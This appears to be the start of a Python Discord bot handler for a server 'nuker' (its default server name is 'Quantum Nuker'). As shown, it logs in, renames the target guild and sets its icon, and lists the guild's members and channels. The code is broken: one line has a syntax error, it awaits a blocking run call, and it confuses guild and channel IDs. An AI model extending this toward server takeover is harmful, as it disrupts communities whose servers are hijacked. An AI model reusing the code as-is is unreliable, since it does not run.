import discord
from discord.ext import commands

class DiscordHandler:
    def __init__(self, bot_token):
        self.bot = commands.Bot(command_prefix="!", intents=discord.Intents.default())
        self.bot_token = bot_token

    async def initialize_bot(self, guild_id=None, setup_name="Quantum Nuker", setup_icon=""):
        if not self.bot_token:
            print("Error: Bot token is missing.")
            return False
        try:
            await self.bot.run(self.bot_token)
            await self.bot.wait_until_ready()
            self.channel = self.bot.get_channel(guild_id) if guild_id else None
            self.guild = self.bot.get_guild(guild_id) if guild_id else None

            if not self.guild:
                print("Error: Could not find the specified Guild ID.")
                return False

            # 1. Server Name and Icon Change
            await self.guild.edit(name=setup_name, icon=setup_icon) if setup_icon else None)

            print("Server metadata updated successfully.")
            return True
        except discord.errors.LoginFailure:
            print("Error: Bot token is invalid or missing permissions.")
            return False
        except Exception as e:
            print(f"An unexpected error occurred during bot initialization: {e}")
            return False

    async def get_members(self, guild):
        return list(guild.members)

    async def get_channels(self, guild):
        return list(guild.channels)
